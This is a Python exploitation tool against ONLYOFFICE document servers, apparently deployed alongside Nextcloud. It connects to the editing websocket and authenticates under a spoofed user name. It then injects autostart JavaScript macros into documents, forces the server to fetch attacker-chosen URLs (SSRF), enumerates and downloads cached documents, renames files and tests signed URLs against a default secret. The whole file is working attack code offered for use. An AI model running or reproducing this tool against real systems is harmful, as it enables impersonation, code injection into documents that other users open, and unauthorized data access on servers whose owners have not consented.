#!/usr/bin/python3
# Exploit ONLYOFFICE implementations

import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib
from urllib.parse import urlparse, parse_qs
import concurrent.futures

def process_fileparts( txt ):
  txt = txt.replace(r'\"','"')[3:-2]
  m = re.search(r'([0-9]\+)\/Editor\.bin\/',txt)
  if m:
    print('DL:',m.group(1))
  data = json.loads(txt)
  print(data)
  tmpdir = tempfile.mkdtemp()
  for fn, url in data['data']['data'].items():
    dest = os.path.join( tmpdir, fn )
    d = os.path.dirname(dest)
    if not os.path.isdir(d):
      print('Creating ' + d)
      os.makedirs(d)
    print('Downloading ' + fn )
    r = requests.get( url, stream=True )
    print('Writing to '+dest,end='')
    with open( dest, 'wb' ) as f:
      for chunk in r:
        print('.',end='')
        f.write(chunk)
    print(' done')
  print( 'finished downloads')
  infile = os.path.join(tmpdir,'Editor.bin')
  outfile = os.path.join(tmpdir,'document.docx')
  print('Attempting to convert ',infile,'to',outfile)
  subprocess.check_output(['x2t/x2t',infile,outfile])
  # subprocess.check_output(['open',outfile])

# See if a signed URL is signed by a default secret
def test_secret_string( signedurl, secret='verysecretstring' ):
  h = get_url_signature( signedurl, secret )
  u = urlparse( signedurl )
  q = parse_qs( u.query )
  if q['md5'][0] == h:
    print('Cypto secret is:', secret)

def get_url_signature( url, secret ):
  u = urlparse( url )
  q = parse_qs( u.query )
  s = q['expires'][0] + u.path.replace('/ds-vpath','') + secret
  m = hashlib.md5()
  m.update(s.encode('utf8'))
  h = base64.b64encode(m.digest()).decode('utf8').strip().replace('+','-').replace('/','_').replace('=','')
  return h

def sign_url( url, secret ):
  h = get_url_signature( url, secret )
  return url + '&md5=' + h


class WsClient():

  autodownload=False
  testsecret=True

  def __init__( self, url, docid, platform, username='admin' ):
    self.docid = docid
    self.platform = platform
    self.url = url
    self.username = username
    self.connect()

  def connect( self ):
    self.url = re.sub(r'^http(s)?','ws\g<1>',self.url)

    if self.platform == 'nextcloud':
      self.url = self.url + '/ds-vpath/doc/'+self.docid+'/c/1/a/websocket'

    print( 'Connecting to', self.url )
    self.ws = websocket.create_connection( self.url )

    # Spawn socket listener
    self.spawn_listener()

  def send( self, message ):
    if type( message ) != str:
      # JSON containing JSON string
      message = json.dumps([json.dumps(message)])
    print(message)
    self.ws.send( message )

  def send_json( self, data ):
    data = json.dumps([json.dumps(data)])
    self.send( data )

  def recv( self ):
    return self.ws.recv()

  def recv_listen( self ):
    while True:
      msg = self.recv()
      if msg.startswith('a["{'):
        try:
          data = json.loads(json.loads(msg[1:])[0])
          print("RECV:", data['type'] )
          if data['type'] == 'message':
            for m in data['messages']:
              print(m['username']+':',m['message'])
          elif data['type'] == 'documentOpen':
            if self.testsecret:
              test_secret_string( data['data']['data']['Editor.bin'] )
          elif data['type'] == 'rpc':
            print(data)
          else:
            print('')
        except:
          print("RECV:", msg)
      else:
        print("RECV:", msg)
      if self.autodownload and 'Editor.bin' in msg:
        process_fileparts(msg)

  def spawn_listener( self ):
    self.listener = threading.Thread( target=self.recv_listen )
    self.listener.start()

  def send_chat_message( self, msg ):
    # ["{\"type\":\"message\",\"message\":\"Egg!\"}"]
    data = json.dumps([json.dumps({
      'type': 'message',
      'message': msg 
    })])
    self.send( data )

  def get_messages( self ):
    self.send_json({"type":"getMessages"})

  def chat( self ):
    print('\nChat mode\n=========\nType messages, ENTER to send\n')
    self.get_messages()
    while True:
      msg = input('> ')
      self.send_chat_message(msg.strip())

  def rename( self, name ):
    self.send_json(
    {
      "type":"rpc",
      "data": {
        'type': 'wopi_RenameFile',
        'name': name
      }
    })

  def auth( self, docurl='' ):
    txt = r'["{\"type\":\"auth\",\"docid\":\"'+self.docid+r'\",\"token\":\"a\",\"user\":{\"id\":\"a\",\"username\":\"'+self.username+r'\",\"firstname\":null,\"lastname\":null,\"indexUser\":-1},\"editorType\":0,\"lastOtherSaveTime\":-1,\"block\":[],\"sessionId\":null,\"sessionTimeConnect\":null,\"sessionTimeIdle\":0,\"documentFormatSave\":65,\"view\":false,\"isCloseCoAuthoring\":false,\"openCmd\":{\"c\":\"open\",\"id\":\"'+self.docid+r'\",\"userid\":\"a\",\"format\":\"docx\",\"url\":\"'+docurl+r'\",\"title\":\"whatever.docx\",\"lcid\":2057,\"nobase64\":false},\"lang\":null,\"mode\":null,\"permissions\":{\"edit\":true},\"IsAnonymousUser\":false}"]'
    self.send( txt )
    # print( self.recv() )
    # count = 1
    # while count < 3:
    #   # print( 'Count:', count )
    #   result = self.recv()
    #   count += 1
    

  def save_changes( self, changes ):
    message = {
      'type':'saveChanges',
      'startSaveChanges':True,
      'endSaveChanges':True,
      'isCoAuthoring':False,
      'isExcel':False,
      'changes':json.dumps(changes),
      'deleteIndex': 1,
      'excelAdditionalInfo':json.dumps({
        'lm':'admin',
        'SYg':'admin',
        'wTg':'14;BgAAADgAMQA0AAAAAAA='
      }),
      'unlock':False,
      'releaseLocks':False
    }
    self.send( message )
    while True:
      print( self.recv() )


  def inject_macro( self, macrotxt ):
    payload = json.dumps({
      "macrosArray":[{
        "name":"Macro 1",
        "value":macrotxt,
        "guid": str(uuid.uuid4()).replace('-',''),
        "autostart": True
      }],
      "current":0
    })
    data = b'\x1e\x00\x00\x00\x5f\x00\x6d\x00\x61\x00\x63\x00\x72\x00\x6f\x00\x73\x00\x47\x00\x6c\x00\x6f\x00\x62\x00\x61\x00\x6c\x00\x49\x00\x64\x00\x01\x00\x00\x00\x00\x00\x00\x00' +(2 * len(payload)).to_bytes(2,byteorder='little')+b'\x00\x00' + bytes(payload, 'utf16')[2:] + b'\x00\x00\x00\x00'
    changes = [str(len(data))+';'+base64.b64encode(data).decode('utf8')]
    self.save_changes( changes )


def main():
  parser = argparse.ArgumentParser(description="ONLYOFFICE exploitation tool")
  parser.add_argument('-u', '--url', help='Base URL of the site running ONLYOFFICE')
  parser.add_argument('-d', '--docid', help='id of the document')
  parser.add_argument('-U', '--username', help='Username to spoof')
  parser.add_argument('-D', '--docurl', help='Document URL to download to OO cache for the current docid (SSRF, unix: pipes supported)', default='')
  parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
  subparsers = parser.add_subparsers(dest='command')

  # Download
  dlparse = subparsers.add_parser('dl')

  # Inject macro
  injparse = subparsers.add_parser('macro')
  injparse.add_argument('script', help='Javascript file to inject into document')

  # Enumerate cached doc ids
  enumparse = subparsers.add_parser('enum')
  enumparse.add_argument('docids', help='text file containing doc ids to test')

  # Chat
  chatparse = subparsers.add_parser('chat')

  # Rename
  rnparse = subparsers.add_parser('rename')
  rnparse.add_argument("filename",help='Filename to rename to')

  args = parser.parse_args()

  if not args.command or not args.url or ( args.command != 'enum' and not args.docid ) or ( args.command == 'enum' and not args.docids ):
    parser.print_help()
    sys.exit(2)

  # Document enumeration
  if args.command == 'enum':
    with open( args.docids, 'r' ) as f:
      for line in f.readline():
        docid = line.strip()
        client = WsClient( args.url, docid, args.platform )
        client.auth()
    sys.exit(0)

  client = WsClient( args.url, args.docid, args.platform, username=args.username )

  # Macro injection
  if args.command == 'macro':
    with open(args.script, 'r') as f:
      client.auth()
      print('Injecting',args.script)
      client.inject_macro(f.read())

  # Poison document cache with external URL
  # SSRF
  if args.command == 'dl':
    client.autodownload = True
    client.auth( args.docurl )

  # Chat
  if args.command == 'chat':
    client.auth()
    client.chat()

  # Rename
  if args.command == 'rename':
    client.auth()
    client.rename( args.filename )

if __name__ == '__main__':
  main()
